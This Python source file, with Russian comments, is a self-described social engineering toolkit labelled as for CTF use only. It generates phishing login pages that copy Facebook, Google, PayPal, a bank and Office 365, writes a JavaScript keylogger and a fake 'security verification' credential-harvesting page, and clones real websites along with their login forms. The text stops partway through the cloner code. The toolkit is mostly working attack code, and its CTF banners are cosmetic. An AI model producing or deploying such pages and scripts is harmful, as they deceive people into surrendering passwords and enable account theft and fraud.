#!/usr/bin/env python3
"""
Social Engineering Toolkit - Инструменты для социальной инженерии (только для CTF)
"""

import argparse
import sys
import random
import string
import json
import time
import os
import re
import requests
from datetime import datetime, timedelta
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from typing import List, Dict, Optional
from utils import *

class PhishingGenerator:
    """Генератор фишинговых страниц"""
    
    def __init__(self):
        self.templates = {
            'facebook': self._facebook_template(),
            'google': self._google_template(),
            'paypal': self._paypal_template(),
            'bank': self._bank_template(),
            'office365': self._office365_template()
        }
    
    def generate_phishing_page(self, target: str, template: str = 'facebook', 
                              output_file: str = None) -> str:
        """Генерация фишинговой страницы"""
        print_warning(f"Генерация фишинговой страницы для {target}...")
        
        if template not in self.templates:
            print_error(f"Неизвестный шаблон: {template}")
            return None
        
        # Очищаем target от недопустимых символов для имени файла
        clean_target = target.replace('https://', '').replace('http://', '').replace('/', '_').replace(':', '_').replace('?', '_').replace('&', '_').replace('=', '_')
        
        # Если output_file не указан, генерируем автоматически
        if output_file is None:
            output_file = f'phishing_{clean_target}_{template}.html'
        
        html_content = self.templates[template].format(
            target=target,
            timestamp=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        )
        
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            print_success(f"Фишинговая страница сохранена: {output_file}")
            print_warning("⚠️  ИСПОЛЬЗУЙТЕ ТОЛЬКО ДЛЯ CTF И ОБРАЗОВАНИЯ!")
            return output_file
            
        except Exception as e:
            print_error(f"Ошибка сохранения: {e}")
            return None
    
    def _facebook_template(self) -> str:
        """Шаблон Facebook"""
        return """
<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Log In or Sign Up</title>
    <style>
        body {{ font-family: Arial, sans-serif; background: #f0f2f5; }}
        .container {{ max-width: 400px; margin: 100px auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        .logo {{ text-align: center; color: #1877f2; font-size: 24px; font-weight: bold; margin-bottom: 20px; }}
        input {{ width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }}
        button {{ width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; }}
        button:hover {{ background: #166fe5; }}
        .warning {{ color: #ff6b6b; font-size: 12px; text-align: center; margin-top: 10px; }}
        .success {{ color: #42b883; font-size: 14px; text-align: center; margin-top: 10px; }}
        .error {{ color: #e74c3c; font-size: 14px; text-align: center; margin-top: 10px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">facebook</div>
        <form id="loginForm">
            <input type="text" id="email" placeholder="Email or phone number" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div id="status"></div>
        <div class="warning">⚠️ CTF DEMO - {target} - {timestamp}</div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {{
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const statusDiv = document.getElementById('status');
            
            // Показываем загрузку
            statusDiv.innerHTML = '<div class="success">Проверка учетных данных...</div>';
            
            // Симулируем отправку данных
            setTimeout(() => {{
                // Сохраняем данные локально для CTF
                const credentials = {{
                    target: '{target}',
                    email: email,
                    password: password,
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    referrer: document.referrer
                }};
                
                // Сохраняем в localStorage для демонстрации
                localStorage.setItem('ctf_credentials_' + Date.now(), JSON.stringify(credentials));
                
                // Показываем результат
                statusDiv.innerHTML = '<div class="success">✅ Успешный вход! (CTF Demo)</div>';
                
                // Логирование для CTF
                console.log('CTF Phishing Demo - Credentials Captured:', credentials);
                
                // В реальном фишинге здесь был бы редирект на настоящий сайт
                setTimeout(() => {{
                    statusDiv.innerHTML = '<div class="success">Перенаправление на Facebook...</div>';
                }}, 2000);
                
            }}, 1500);
        }});
        
        // Дополнительное логирование для CTF
        console.log('CTF Phishing Page Loaded:', {{
            target: '{target}',
            timestamp: new Date().toISOString(),
            url: window.location.href
        }});
    </script>
</body>
</html>
"""
    
    def _google_template(self) -> str:
        """Шаблон Google"""
        return """
<!DOCTYPE html>
<html>
<head>
    <title>Sign in - Google Accounts</title>
    <style>
        body {{ font-family: 'Google Sans', Arial, sans-serif; background: white; }}
        .container {{ max-width: 450px; margin: 50px auto; padding: 48px 40px 36px; }}
        .logo {{ text-align: center; margin-bottom: 24px; }}
        .logo img {{ width: 75px; height: 24px; }}
        h1 {{ text-align: center; font-size: 24px; font-weight: 400; margin-bottom: 8px; }}
        .subtitle {{ text-align: center; color: #5f6368; margin-bottom: 24px; }}
        input {{ width: 100%; padding: 13px 15px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }}
        button {{ width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 14px; cursor: pointer; margin-top: 8px; }}
        .warning {{ color: #ea4335; font-size: 12px; text-align: center; margin-top: 20px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNzUiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCA3NSAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTY5LjA5MjMgMTIuNDA5MUM2OS4wOTIzIDExLjY2MzYgNjkuMDQ2MSAxMC45OTU0IDY4Ljk1MzggMTAuMzYzNkgzOC4zNjM2VjE0LjQ1NDVINjQuOTU0NUM2NC42MzY0IDE2LjE4MTggNjMuNjgxOCAxNy41NDU0IDYyLjE5MDkgMTguNDU0NUw2OS4wOTIzIDEyLjQwOTFaIiBmaWxsPSIjNDI4NUY0Ii8+CjxwYXRoIGQ9Ik0zOC4zNjM2IDI0QzQ3LjgxODIgMjQgNTUuNDU0NSAyMC4xODE4IDU5LjA5MDkgMTQuNDU0NUw2Mi4xOTA5IDE4LjQ1NDVDNTcuNjM2NCAyMi4wOTA5IDQ4LjYzNjQgMjQuNzI3MyAzOC4zNjM2IDI0QzI4LjA5MDkgMjQgMTkuMDkwOSAxOS4wOTA5IDE0LjU0NTUgMTIuNzI3M0wxMC45MDkxIDE2LjcyNzNDMTQuNTQ1NSAyMi4wOTA5IDI1LjkwOTEgMjQgMzguMzYzNiAyNFoiIGZpbGw9IjM0QTg1MyIvPgo8cGF0aCBkPSJNMTQuNTQ1NSAxMi43MjczQzE0LjA5MDkgMTEuNjM2NCAxMy44MTgyIDEwLjQ1NDUgMTMuODE4MiA5LjA5MDkxQzEzLjgxODIgNy43MjczIDE0LjA5MDkgNi41NDU0NSAxNC41NDU1IDUuNDU0NTVMMTAuOTA5MSAxLjQ1NDU1QzkuNTQ1NDUgMy4yNzI3MyA4LjcyNzI3IDUuNDU0NTUgOC43MjcyNyA5LjA5MDkxQzguNzI3MjcgMTIuNzI3MyA5LjU0NTQ1IDE0LjkwOTEgMTAuOTA5MSAxNi43MjczTDE0LjU0NTUgMTIuNzI3M1oiIGZpbGw9IiNGQkJDMzQiLz4KPHBhdGggZD0iTTM4LjM2MzYgMEMyNS45MDkxIDAgMTQuNTQ1NSAzLjkwOTA5IDEwLjkwOTEgOS4wOTA5MUwxNC41NDU1IDEzLjA5MDlDMTkuMDkwOSA2LjcyNzI3IDI4LjA5MDkgMS44MTgxOCAzOC4zNjM2IDEuODE4MThDNDguNjM2NCAxLjgxODE4IDU3LjYzNjQgNi43MjcyNyA2Mi4xOTA5IDEzLjA5MDlMNjUuODM2NCA5LjA5MDkxQzYxLjE4MTggMy45MDkwOSA0OS44MTgyIDAgMzguMzYzNiAwWiIgZmlsbD0iI0VBNDMzNSIvPgo8L3N2Zz4K" alt="Google">
        </div>
        <h1>Sign in</h1>
        <p class="subtitle">Use your Google Account</p>
        <form onsubmit="handleSubmit()">
            <input type="email" id="email" placeholder="Email or phone" required>
            <button type="submit">Next</button>
        </form>
        <div class="warning">⚠️ CTF DEMO - {target} - {timestamp}</div>
    </div>
    
    <script>
        function handleSubmit() {{
            const email = document.getElementById('email').value;
            alert('CTF Demo: Email captured - ' + email);
            console.log('CTF Phishing Demo:', {{
                target: '{target}',
                email: email,
                timestamp: new Date().toISOString()
            }});
        }}
    </script>
</body>
</html>
"""
    
    def _paypal_template(self) -> str:
        """Шаблон PayPal"""
        return """
<!DOCTYPE html>
<html>
<head>
    <title>PayPal: Log in to your account</title>
    <style>
        body {{ font-family: Arial, sans-serif; background: #f7f9fc; }}
        .header {{ background: #003087; color: white; padding: 10px 0; text-align: center; }}
        .container {{ max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        .logo {{ color: #003087; font-size: 28px; font-weight: bold; text-align: center; margin-bottom: 20px; }}
        input {{ width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }}
        button {{ width: 100%; padding: 12px; background: #0070ba; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }}
        .warning {{ color: #d63384; font-size: 12px; text-align: center; margin-top: 15px; }}
    </style>
</head>
<body>
    <div class="header">
        <strong>PayPal</strong>
    </div>
    <div class="container">
        <div class="logo">PayPal</div>
        <form onsubmit="handleSubmit()">
            <input type="email" id="email" placeholder="Email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="warning">⚠️ CTF DEMO - {target} - {timestamp}</div>
    </div>
    
    <script>
        function handleSubmit() {{
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            alert('CTF Demo: PayPal credentials captured - ' + email);
            console.log('CTF Phishing Demo:', {{
                target: '{target}',
                email: email,
                timestamp: new Date().toISOString()
            }});
        }}
    </script>
</body>
</html>
"""
    
    def _bank_template(self) -> str:
        """Шаблон банка"""
        return """
<!DOCTYPE html>
<html>
<head>
    <title>Online Banking - Secure Login</title>
    <style>
        body {{ font-family: Arial, sans-serif; background: #f5f5f5; }}
        .header {{ background: #1e3a8a; color: white; padding: 15px; text-align: center; }}
        .container {{ max-width: 450px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }}
        .logo {{ color: #1e3a8a; font-size: 24px; font-weight: bold; text-align: center; margin-bottom: 20px; }}
        .security-notice {{ background: #fef3c7; border: 1px solid #f59e0b; padding: 10px; border-radius: 4px; margin-bottom: 20px; font-size: 14px; }}
        input {{ width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #d1d5db; border-radius: 4px; box-sizing: border-box; }}
        button {{ width: 100%; padding: 12px; background: #1e3a8a; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }}
        .warning {{ color: #dc2626; font-size: 12px; text-align: center; margin-top: 15px; }}
    </style>
</head>
<body>
    <div class="header">
        <strong>Secure Online Banking</strong>
    </div>
    <div class="container">
        <div class="logo">🏦 SecureBank</div>
        <div class="security-notice">
            🔒 Your security is our priority. Please log in to access your account.
        </div>
        <form onsubmit="handleSubmit()">
            <input type="text" id="username" placeholder="Username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Secure Login</button>
        </form>
        <div class="warning">⚠️ CTF DEMO - {target} - {timestamp}</div>
    </div>
    
    <script>
        function handleSubmit() {{
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            alert('CTF Demo: Bank credentials captured - ' + username);
            console.log('CTF Phishing Demo:', {{
                target: '{target}',
                username: username,
                timestamp: new Date().toISOString()
            }});
        }}
    </script>
</body>
</html>
"""
    
    def _office365_template(self) -> str:
        """Шаблон Office 365"""
        return """
<!DOCTYPE html>
<html>
<head>
    <title>Sign in to your Microsoft account</title>
    <style>
        body {{ font-family: 'Segoe UI', Arial, sans-serif; background: white; }}
        .container {{ max-width: 400px; margin: 50px auto; padding: 40px; }}
        .logo {{ text-align: center; margin-bottom: 30px; }}
        .logo img {{ width: 108px; height: 23px; }}
        h1 {{ text-align: center; font-size: 24px; font-weight: 300; margin-bottom: 8px; }}
        .subtitle {{ text-align: center; color: #666; margin-bottom: 30px; }}
        input {{ width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 2px; font-size: 16px; }}
        button {{ width: 100%; padding: 12px; background: #0078d4; color: white; border: none; border-radius: 2px; font-size: 14px; cursor: pointer; }}
        .warning {{ color: #d13438; font-size: 12px; text-align: center; margin-top: 20px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTA4IiBoZWlnaHQ9IjIzIiB2aWV3Qm94PSIwIDAgMTA4IDIzIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cGF0aCBkPSJNMTAgMTBIMTNWMTNIMTBWMTBaIiBmaWxsPSIjRjI1MDA1Ii8+CjxwYXRoIGQ9Ik0xMCAxNEgxM1YxN0gxMFYxNFoiIGZpbGw9IiMwMDc4RCIvPgo8cGF0aCBkPSJNMTQgMTBIMTdWMTNIMTRWMTBaIiBmaWxsPSIjMDA3OEMiLz4KPHBhdGggZD0iTTE0IDE0SDE3VjE3SDE0VjE0WiIgZmlsbD0iIzAwNzhEIi8+CjxwYXRoIGQ9Ik0xOCAxMEgyMVYxM0gxOFYxMFoiIGZpbGw9IiMwMDc4QyIvPgo8cGF0aCBkPSJNMTggMTRIMjFWMTdIMThWMTRaIiBmaWxsPSIjMDA3OEQiLz4KPHBhdGggZD0iTTIyIDEwSDI1VjEzSDIyVjEwWiIgZmlsbD0iIzAwNzhDIi8+CjxwYXRoIGQ9Ik0yMiAxNEgyNVYxN0gyMlYxNFoiIGZpbGw9IiMwMDc4RCIvPgo8cGF0aCBkPSJNMjYgMTBIMjlWMTNIMjZWMTBaIiBmaWxsPSIjMDA3OEMiLz4KPHBhdGggZD0iTTI2IDE0SDI5VjE3SDI2VjE0WiIgZmlsbD0iIzAwNzhEIi8+CjxwYXRoIGQ9Ik0zMCAxMEgzM1YxM0gzMFYxMFoiIGZpbGw9IiMwMDc4QyIvPgo8cGF0aCBkPSJNMzAgMTRIMzNWMTdIMzBWMTRaIiBmaWxsPSIjMDA3OEQiLz4KPHBhdGggZD0iTTM0IDEwSDM3VjEzSDM0VjEwWiIgZmlsbD0iIzAwNzhDIi8+CjxwYXRoIGQ9Ik0zNCAxNEgzN1YxN0gzNFYxNFoiIGZpbGw9IiMwMDc4RCIvPgo8cGF0aCBkPSJNMzggMTBINDFWMTNIMzhWMTAiIGZpbGw9IiMwMDc4QyIvPgo8cGF0aCBkPSJNMzggMTRINDFWMTdIMzhWMTRaIiBmaWxsPSIjMDA3OEQiLz4KPHBhdGggZD0iTTQyIDEwSDQ1VjEzSDQyVjEwWiIgZmlsbD0iIzAwNzhDIi8+CjxwYXRoIGQ9Ik00MiAxNEg0NVYxN0g0MlYxNFoiIGZpbGw9IiMwMDc4RCIvPgo8cGF0aCBkPSJNNDYgMTBINDlWMTNINDZWMTAiIGZpbGw9IiMwMDc4QyIvPgo8cGF0aCBkPSJNNDYgMTRINDlWMTdINDZWMTRaIiBmaWxsPSIjMDA3OEQiLz4KPHBhdGggZD0iTTUwIDEwSDUzVjEzSDUwVjEwWiIgZmlsbD0iIzAwNzhDIi8+CjxwYXRoIGQ9Ik01MCAxNEg1M1YxN0g1MFYxNFoiIGZpbGw9IiMwMDc4RCIvPgo8cGF0aCBkPSJNNTQgMTBINTdWMTNINTRWMTAiIGZpbGw9IiMwMDc4QyIvPgo8cGF0aCBkPSJNNTQgMTRINTdWMTdINTRWMTRaIiBmaWxsPSIjMDA3OEQiLz4KPHBhdGggZD0iTTU4IDEwSDYxVjEzSDU4VjEwWiIgZmlsbD0iIzAwNzhDIi8+CjxwYXRoIGQ9Ik01OCAxNEg2MVYxN0g1OFYxNFoiIGZpbGw9IiMwMDc4RCIvPgo8cGF0aCBkPSJNNjIgMTBINjVWMTNINjJWMTAiIGZpbGw9IiMwMDc4QyIvPgo8cGF0aCBkPSJNNjIgMTRINjVWMTdINjJWMTRaIiBmaWxsPSIjMDA3OEQiLz4KPHBhdGggZD0iTTY2IDEwSDY5VjEzSDY2VjEwWiIgZmlsbD0iIzAwNzhDIi8+CjxwYXRoIGQ9Ik02NiAxNEg2OVYxN0g2NlYxNFoiIGZpbGw9IiMwMDc4RCIvPgo8cGF0aCBkPSJNNzAgMTBINzNWMTNINzBWMTAiIGZpbGw9IiMwMDc4QyIvPgo8cGF0aCBkPSJNNzAgMTRINzNWMTdINzBWMTRaIiBmaWxsPSIjMDA3OEQiLz4KPHBhdGggZD0iTTc0IDEwSDc3VjEzSDc0VjEwWiIgZmlsbD0iIzAwNzhDIi8+CjxwYXRoIGQ9Ik03NCAxNEg3N1YxN0g3NFYxNFoiIGZpbGw9IiMwMDc4RCIvPgo8cGF0aCBkPSJNNzggMTBINDFWMTNINzhWMTAiIGZpbGw9IiMwMDc4QyIvPgo8cGF0aCBkPSJNNzggMTRINDFWMTdINzhWMTRaIiBmaWxsPSIjMDA3OEQiLz4KPHBhdGggZD0iTTgyIDEwSDg1VjEzSDgyVjEwWiIgZmlsbD0iIzAwNzhDIi8+CjxwYXRoIGQ9Ik04MiAxNEg4NVYxN0g4MlYxNFoiIGZpbGw9IiMwMDc4RCIvPgo8cGF0aCBkPSJNODYgMTBIOVYxM0g4NlYxMFoiIGZpbGw9IiMwMDc4QyIvPgo8cGF0aCBkPSJNODYgMTRIOVYxN0g4NlYxNFoiIGZpbGw9IiMwMDc4RCIvPgo8cGF0aCBkPSJNOTAgMTBIOVYxM0g5MFYxMFoiIGZpbGw9IiMwMDc4QyIvPgo8cGF0aCBkPSJNOTAgMTRIOVYxN0g5MFYxNFoiIGZpbGw9IiMwMDc4RCIvPgo8cGF0aCBkPSJNOTQgMTBIOVYxM0g5NFYxMFoiIGZpbGw9IiMwMDc4QyIvPgo8cGF0aCBkPSJNOTQgMTRIOVYxN0g5NFYxNFoiIGZpbGw9IiMwMDc4RCIvPgo8cGF0aCBkPSJNOTggMTBIOVYxM0g5OFYxMFoiIGZpbGw9IiMwMDc4QyIvPgo8cGF0aCBkPSJNOTggMTRIOVYxN0g5OFYxNFoiIGZpbGw9IiMwMDc4RCIvPgo8cGF0aCBkPSJNMTAyIDEwSDEwNVYxM0gxMDJWMTAiIGZpbGw9IiMwMDc4QyIvPgo8cGF0aCBkPSJNMTAyIDE0SDEwNVYxN0gxMDJWMTRaIiBmaWxsPSIjMDA3OEQiLz4KPC9zdmc+Cg==" alt="Microsoft">
        </div>
        <h1>Sign in</h1>
        <p class="subtitle">to your Microsoft account</p>
        <form onsubmit="handleSubmit()">
            <input type="email" id="email" placeholder="Email, phone, or Skype" required>
            <button type="submit">Next</button>
        </form>
        <div class="warning">⚠️ CTF DEMO - {target} - {timestamp}</div>
    </div>
    
    <script>
        function handleSubmit() {{
            const email = document.getElementById('email').value;
            alert('CTF Demo: Microsoft credentials captured - ' + email);
            console.log('CTF Phishing Demo:', {{
                target: '{target}',
                email: email,
                timestamp: new Date().toISOString()
            }});
        }}
    </script>
</body>
</html>
"""

class CredentialHarvester:
    """Сборщик учетных данных"""
    
    def __init__(self):
        self.captured_credentials = []
    
    def generate_keylogger_script(self, output_file: str = 'keylogger.js') -> str:
        """Генерация JavaScript keylogger"""
        print_warning("Генерация JavaScript keylogger...")
        
        script = """
// CTF Keylogger Demo - ТОЛЬКО ДЛЯ ОБРАЗОВАНИЯ!
(function() {
    'use strict';
    
    let capturedData = {
        keystrokes: [],
        forms: [],
        urls: [],
        timestamp: new Date().toISOString()
    };
    
    // Захват нажатий клавиш
    document.addEventListener('keydown', function(e) {
        capturedData.keystrokes.push({
            key: e.key,
            code: e.code,
            timestamp: new Date().toISOString(),
            target: e.target.tagName + (e.target.id ? '#' + e.target.id : '') + (e.target.className ? '.' + e.target.className : '')
        });
        
        // Ограничиваем количество записей
        if (capturedData.keystrokes.length > 1000) {
            capturedData.keystrokes = capturedData.keystrokes.slice(-500);
        }
    });
    
    // Захват данных форм
    document.addEventListener('submit', function(e) {
        const form = e.target;
        const formData = new FormData(form);
        const data = {};
        
        for (let [key, value] of formData.entries()) {
            data[key] = value;
        }
        
        capturedData.forms.push({
            action: form.action,
            method: form.method,
            data: data,
            timestamp: new Date().toISOString()
        });
    });
    
    // Захват URL изменений
    let currentUrl = window.location.href;
    capturedData.urls.push({
        url: currentUrl,
        timestamp: new Date().toISOString()
    });
    
    // Отправка данных (в реальном keylogger)
    function sendData() {
        if (capturedData.keystrokes.length > 0 || capturedData.forms.length > 0) {
            console.log('CTF Keylogger Demo - Captured Data:', capturedData);
            
            // В реальном keylogger здесь был бы отправка на сервер
            // fetch('/collect', { method: 'POST', body: JSON.stringify(capturedData) });
        }
    }
    
    // Отправка данных каждые 30 секунд
    setInterval(sendData, 30000);
    
    // Отправка при закрытии страницы
    window.addEventListener('beforeunload', sendData);
    
    console.log('CTF Keylogger Demo loaded - ' + new Date().toISOString());
})();
"""
        
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(script)
            
            print_success(f"Keylogger скрипт сохранен: {output_file}")
            print_warning("⚠️  ИСПОЛЬЗУЙТЕ ТОЛЬКО ДЛЯ CTF И ОБРАЗОВАНИЯ!")
            return output_file
            
        except Exception as e:
            print_error(f"Ошибка сохранения: {e}")
            return None
    
    def generate_credential_harvester(self, target_domain: str, 
                                    output_file: str = 'harvester.html') -> str:
        """Генерация страницы для сбора учетных данных"""
        print_warning(f"Генерация credential harvester для {target_domain}...")
        
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Security Verification - {target_domain}</title>
    <style>
        body {{ font-family: Arial, sans-serif; background: #f5f5f5; }}
        .container {{ max-width: 500px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }}
        .header {{ background: #dc3545; color: white; padding: 15px; text-align: center; border-radius: 4px; margin-bottom: 20px; }}
        .warning {{ background: #fff3cd; border: 1px solid #ffeaa7; padding: 15px; border-radius: 4px; margin-bottom: 20px; }}
        input {{ width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }}
        button {{ width: 100%; padding: 12px; background: #dc3545; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }}
        .ctf-notice {{ color: #6c757d; font-size: 12px; text-align: center; margin-top: 20px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h2>🔒 Security Verification Required</h2>
        </div>
        
        <div class="warning">
            <strong>⚠️ Important Security Notice:</strong><br>
            We have detected suspicious activity on your account. Please verify your credentials to secure your account.
        </div>
        
        <form id="verificationForm">
            <input type="text" id="username" placeholder="Username or Email" required>
            <input type="password" id="password" placeholder="Password" required>
            <input type="text" id="securityCode" placeholder="Security Code (if applicable)">
            <button type="submit">Verify Account</button>
        </form>
        
        <div class="ctf-notice">
            CTF DEMO - {target_domain} - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        </div>
    </div>
    
    <script>
        document.getElementById('verificationForm').addEventListener('submit', function(e) {{
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const securityCode = document.getElementById('securityCode').value;
            
            const credentials = {{
                target: '{target_domain}',
                username: username,
                password: password,
                securityCode: securityCode,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                referrer: document.referrer
            }};
            
            // В реальном harvester здесь была бы отправка на сервер
            console.log('CTF Credential Harvester Demo:', credentials);
            alert('CTF Demo: Credentials captured - ' + username);
            
            // Симуляция "успешной" верификации
            setTimeout(() => {{
                alert('Account verified successfully! (CTF Demo)');
            }}, 1000);
        }});
    </script>
</body>
</html>
"""
        
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            print_success(f"Credential harvester сохранен: {output_file}")
            print_warning("⚠️  ИСПОЛЬЗУЙТЕ ТОЛЬКО ДЛЯ CTF И ОБРАЗОВАНИЯ!")
            return output_file
            
        except Exception as e:
            print_error(f"Ошибка сохранения: {e}")
            return None

class WebsiteCloner:
    """Клонирование веб-сайтов для социальной инженерии"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.downloaded_files = []
        self.base_url = ""
        self.domain = ""
    
    def clone_website(self, url: str, output_dir: str = "cloned_site") -> Dict:
        """Клонирование веб-сайта"""
        print_warning(f"⚠️  КЛОНИРОВАНИЕ САЙТА - ТОЛЬКО ДЛЯ CTF И ОБРАЗОВАНИЯ!")
        print_info(f"Клонирование сайта: {url}")
        
        # Создаем директорию для клонированного сайта
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        self.base_url = url
        parsed_url = urlparse(url)
        self.domain = parsed_url.netloc
        
        result = {
            'original_url': url,
            'output_dir': output_dir,
            'downloaded_files': [],
            'errors': [],
            'forms_found': [],
            'login_forms': []
        }
        
        try:
            # Загружаем главную страницу
            print_info("Загрузка главной страницы...")
            response = self.session.get(url, timeout=10)
            response.raise_for_status()
            
            # Сохраняем главную страницу
            main_file = os.path.join(output_dir, "index.html")
            with open(main_file, 'w', encoding='utf-8') as f:
                f.write(response.text)
            result['downloaded_files'].append(main_file)
            print_success(f"Главная страница сохранена: {main_file}")
            
            # Анализируем HTML
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Находим все формы
            forms = self._analyze_forms(soup, url)
            result['forms_found'] = forms
            
            # Находим формы входа
            login_forms = self._find_login_forms(soup)
            result['login_forms'] = login_forms
            
            # Загружаем ресурсы (CSS, JS, изображения)
            self._download_resources(soup, url, output_dir, result)
            
            # Создаем модифицированную версию с перехватом данных
            self._create_modified_version(soup, output_dir, result)
            
            print_success(f"Клонирование завершено. Файлов: {len(result['downloaded_files'])}")
            return result
            
        except Exception as e:
            error_msg = f"Ошибка клонирования: {e}"
            print_error(error_msg)
            result['errors'].append(error_msg)
            return result
    
    def _analyze_forms(self, soup: BeautifulSoup, base_url: str) -> List[Dict]:
        """Анализ форм на странице"""
        forms = []
        
        for i, form in enumerate(soup.find_all('form')):
            form_info = {
                'index': i,
                'action': form.get('action', ''),
                'method': form.get('method', 'GET').upper(),
                'inputs': [],
                'is_login_form': False
            }
            
            # Анализируем поля ввода
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                input_info = {
                    'type': input_tag.get('type', 'text'),
                    'name': input_tag.get('name', ''),
                    'id': input_tag.get('id', ''),
                    'placeholder': input_tag.get('placeholder', ''),
                    'required': input_tag.has_attr('required')
                }
                form_info['inputs'].append(input_info)
            
            # Проверяем, является ли это формой входа
            if self._is_login_form(form_info):
                form_info['is_login_form'] = True
            
            forms.append(form_info)
        
        print_success(f"Найдено форм: {len(forms)}")
        return forms
    
    def _is_login_form(self, form_info: Dict) -> bool:
        """Проверка, является ли форма формой входа"""
        login_indicators = ['password', 'login', 'email', 'username', 'user']
        
        for input_field in form_info['inputs']:
            field_name = input_field['name'].lower()
            field_type = input_field['type'].lower()
            
            if field_type == 'password':
                return True
            
            for indicator in login_indicators:
                if indicator in field_name:
                    return True
        
        return False
    
    def _find_login_forms(self, soup: BeautifulSoup) -> List[Dict]:
        """Поиск форм входа"""
        login_forms = []
        
        # Ищем формы с полями пароля
        password_forms = soup.find_all('input', {'type': 'password'})
        
        for password_input in password_forms:
            form = password_input.find_parent('form')
            if form:
                form_info = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'GET').upper(),
                    'password_field': password_input.get('name', ''),
                    'username_field': '',
                    'form_html': str(form)
                }
                
                # Ищем поле имени пользователя
                username_inputs = form.find_all(['input'], {'type': ['text', 'email']})
                if username_inputs:
                    form_info['username_field'] = username_inputs[0].get('name', '')
                
                login_forms.append(form_info)
        
        print_success(f"Найдено форм входа: {len(login_forms)}")
        return login_forms
    
    def _download_resources(self, soup: BeautifulSoup, base_url: str, output_dir: str, result: Dict):
        """Загрузка ресурсов (CSS, JS, изображения)"""
        print_info("Загрузка ресурсов...")
        
        # Создаем папки для ресурсов
        css_dir = os.path.join(output_dir, "css")
        js_dir = os.path.join(output_dir, "js")
        images_dir = os.path.join(output_dir, "images")
        
        for dir_path in [css_dir, js_dir, images_dir]:
            if not os.path.exists(dir_path):
                os.makedirs(dir_path)
        
        # Загружаем CSS файлы
        for link in soup.find_all('link', {'rel': 'stylesheet'}):
            href = link.get('href')
            if href:
                self._download_file(href, base_url, css_dir, result)
        
        # Загружаем JS файлы
        for script in soup.find_all('script', src=True):
            src = script.get('src')
            if src:
                self._download_file(src, base_url, js_dir, result)
        
        # Загружаем изображения
        for img in soup.find_all('img', src=True):
            src = img.get('src')
            if src:
                self._download_file(src, base_url, images_dir, result)
    
    def _download_file(self, url: str, base_url: str, output_dir: str, result: Dict):
        """Загрузка отдельного файла"""
        try:
            # Преобразуем относительный URL в абсолютный
            if url.startswith('//'):
                url = 'https:' + url
            elif url.startswith('/'):
                parsed_base = urlparse(base_url)
                url = f"{parsed_base.scheme}://{parsed_base.netloc}{url}"
            elif not url.startswith('http'):
                url = urljoin(base_url, url)
            
            # Получаем имя файла
            filename = os.path.basename(urlparse(url).path)
            if not filename:
                filename = "index.html"
            
            # Загружаем файл
            response = self.session.get(url, timeout=5)
            response.raise_for_status()
            
            # Сохраняем файл
            file_path = os.path.join(output_dir, filename)
            with open(file_path, 'wb') as f:
                f.write(response.content)
            
            result['downloaded_files'].append(file_path)
